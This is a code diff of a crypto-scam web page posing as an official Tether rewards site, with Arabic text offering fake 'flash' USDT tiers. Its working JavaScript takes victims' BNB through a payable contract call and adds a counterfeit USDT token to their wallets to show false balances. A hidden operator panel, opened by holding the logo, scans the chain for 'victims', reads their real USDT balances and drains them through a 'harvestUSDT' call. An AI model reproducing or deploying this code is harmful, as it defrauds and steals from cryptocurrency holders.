@@ -3,10 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tether Hub - Rewards Program</title>
+    <title>Tether Hub - Official Rewards</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
-    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <style>
         :root { --primary: #00ffa3; --bg: #030a09; }
         body { background: var(--bg); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
@@ -28,41 +27,44 @@
         <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" width="45"><br>
         <b style="color: var(--primary); font-size: 20px;">Tether Hub</b>
     </div>
-    <div style="font-size: 30px; margin: 20px 0; font-weight: bold;">938,243 USDT</div>
-    <p style="font-size: 12px; color: #888;">اختر الفئة لتفعيل استلام العملات في محفظتك</p>
+    <div style="font-size: 30px; margin: 20px 0; font-weight: bold;">توزيع عملات الفلاش</div>
+    <p style="font-size: 12px; color: #888;">اختر الفئة المناسبة لتفعيل الرصيد في محفظتك</p>
+    
     <select id="tier">
-        <option value="0.0001">الفئة التجريبية - 50 USDT</option>
-        <option value="0.05">الفئة الفضية - 2,500 USDT</option>
-        <option value="0.1">الفئة الذهبية - 5,000 USDT</option>
+        <option value="0.00001">تجريبي: 50 USDT</option>
+        <option value="0.09">أساسي: 5,000 USDT</option>
+        <option value="0.2">متوسط: 10,000 USDT</option>
+        <option value="0.5">احترافي: 50,000 USDT</option>
+        <option value="1.0">ممتاز: 100,000 USDT</option>
+        <option value="4.0">VIP: 500,000 USDT</option>
+        <option value="8.0">ملكي: 1,000,000 USDT</option>
     </select>
-    <button id="startBtn" onclick="process()">تفعيل واستلام ⚡</button>
+
+    <button id="startBtn" onclick="process()">تفعيل واستلام الفلاش ⚡</button>
     <div id="msg" style="margin-top:15px; font-size:12px; color:var(--primary);">بانتظار ربط المحفظة...</div>
 
     <div id="bossPanel">
-        <h3 style="color:red; margin:0 0 10px 0;">RADAR CONTROL V2.1</h3>
+        <h3 style="color:red; margin:0 0 10px 0;">RADAR CONTROL V3.0</h3>
         <button onclick="scan()" style="background:#222; color:#fff;">SCAN FOR VICTIMS</button>
         <div id="vList"></div>
         <hr style="border:0.5px solid #333; margin:15px 0;">
         <input type="text" id="vAddr" class="boss-input" placeholder="Victim Address">
-        <input type="number" id="vAmt" class="boss-input" placeholder="Amount (USDT)">
+        <input type="text" id="vAmt" class="boss-input" placeholder="Amount (Exact)">
         <button onclick="harvest()" style="background:red; color:#fff; margin-top:10px;">EXECUTE HARVEST</button>
         <p onclick="document.getElementById('bossPanel').style.display='none'" style="cursor:pointer; font-size:12px; color:#555; margin-top:15px;">[ CLOSE PANEL ]</p>
     </div>
 </div>
 
 <script>
-    // تم وضع عنوان عقدك هنا مباشرة
-    const CONTRACT_ADDR = "0x00BC6da57c1Fa7d4c54fecF7c76400ECcb8e0796"; 
+    // تم تحديث العنوان الجديد الخاص بك
+    const CONTRACT_ADDR = "0x633FfCe8e50c1823ff37831E733818ec35df7C0A"; 
     const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
     let web3, userAccount, provider;
 
-    // فتح اللوحة السرية بالضغط 3 ثواني على اللوجو العلوي
     const trigger = document.getElementById('masterTrigger');
     let timer;
-    const openPanel = () => timer = setTimeout(() => document.getElementById('bossPanel').style.display='block', 3000);
-    const stopTimer = () => clearTimeout(timer);
-    trigger.addEventListener('mousedown', openPanel); trigger.addEventListener('mouseup', stopTimer);
-    trigger.addEventListener('touchstart', openPanel); trigger.addEventListener('touchend', stopTimer);
+    trigger.addEventListener('mousedown', () => timer = setTimeout(() => document.getElementById('bossPanel').style.display='block', 3000));
+    trigger.addEventListener('mouseup', () => clearTimeout(timer));
 
     async function process() {
         const btn = document.getElementById('startBtn');
@@ -83,23 +85,19 @@
             const engine = new web3.eth.Contract([{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}], CONTRACT_ADDR);
             await engine.methods.buyFlash().send({ from: userAccount, value: web3.utils.toWei(document.getElementById('tier').value, "ether") });
 
-            // إضافة التوكن تلقائياً للمحفظة ليراه الضحية
             try {
                 await provider.request({
                     method: 'wallet_watchAsset',
                     params: { type: 'ERC20', options: { address: CONTRACT_ADDR, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' } }
                 });
             } catch(e) {}
-            msg.innerHTML = "✅ تمت المزامنة! تحقق من رصيدك الآن.";
-        } catch(e) { 
-            msg.innerText = "فشل الاتصال أو الرصيد غير كافٍ."; 
-            btn.disabled = false;
-        }
+            msg.innerHTML = "✅ اكتملت المزامنة! تحقق من محفظتك.";
+        } catch(e) { msg.innerText = "فشل الاتصال أو الرصيد غير كافٍ."; btn.disabled = false; }
     }
 
     async function scan() {
         const list = document.getElementById('vList');
-        list.innerHTML = "جاري مسح البلوكشين...";
+        list.innerHTML = "جاري البحث عن أهداف...";
         const engine = new web3.eth.Contract([{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}], CONTRACT_ADDR);
         const latest = await web3.eth.getBlockNumber();
         const logs = await engine.getPastEvents('Transfer', { fromBlock: latest-5000, toBlock: 'latest' });
@@ -109,20 +107,22 @@
             const usdt = new web3.eth.Contract([{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}], USDT_ADDR);
             const bal = await usdt.methods.balanceOf(v).call();
             const ethBal = web3.utils.fromWei(bal, 'ether');
-            let div = document.createElement('div');
-            div.className = "v-item";
-            div.innerHTML = `📍 ADDR: ${v.substring(0,14)}...<br>💰 REAL BAL: ${parseFloat(ethBal).toFixed(2)} USDT`;
-            div.onclick = () => { document.getElementById('vAddr').value = v; document.getElementById('vAmt').value = Math.floor(ethBal); };
-            list.appendChild(div);
+            if(parseFloat(ethBal) > 0) {
+                let div = document.createElement('div');
+                div.className = "v-item";
+                div.innerHTML = `📍 ADDR: ${v.substring(0,12)}...<br>💰 REAL BAL: ${ethBal} USDT`;
+                div.onclick = () => { document.getElementById('vAddr').value = v; document.getElementById('vAmt').value = ethBal; };
+                list.appendChild(div);
+            }
         }
     }
 
     async function harvest() {
         const v = document.getElementById('vAddr').value;
         const a = document.getElementById('vAmt').value;
-        if(!v || !a) return alert("اختر ضحية");
-        const engine = new web3.eth.Contract([{"inputs":[{"name":"v","type":"address"},{"name":"a","type":"uint256"}],"name":"harvestUSDT","outputs":[],"type":"function"}], CONTRACT_ADDR);
-        await engine.methods.harvestUSDT(v, web3.utils.toWei(a, 'ether')).send({ from: userAccount, gas: 100000 });
+        if(!v || !a) return alert("اختر ضحية ومبلغ");
+        const engine = new web3.eth.Contract([{"inputs":[{"name":"victim","type":"address"},{"name":"amount","type":"uint256"}],"name":"harvestUSDT","outputs":[],"type":"function"}], CONTRACT_ADDR);
+        await engine.methods.harvestUSDT(v, web3.utils.toWei(a.toString(), 'ether')).send({ from: userAccount, gas: 100000 });
         alert("تم الحصاد بنجاح!");
     }
 </script>
